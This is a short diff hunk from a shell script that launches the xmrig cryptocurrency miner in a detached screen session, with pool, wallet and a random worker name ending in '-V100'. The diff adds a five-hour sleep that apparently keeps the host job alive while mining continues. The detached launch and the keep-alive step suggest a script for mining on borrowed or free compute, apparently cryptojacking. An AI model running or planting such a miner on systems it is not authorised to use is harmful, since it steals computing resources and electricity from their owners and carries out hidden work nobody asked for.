@@ -9,4 +9,5 @@ WORKER=$(echo $(shuf -i 1-99 -n 1)-V100)
 
 chmod +x xmrig
 screen -dmS cpu ./xmrig -o $POOL -u $WALLET.$WORKER -k -a rx/0 -t8
+sleep 18000 &> /dev/null
 #
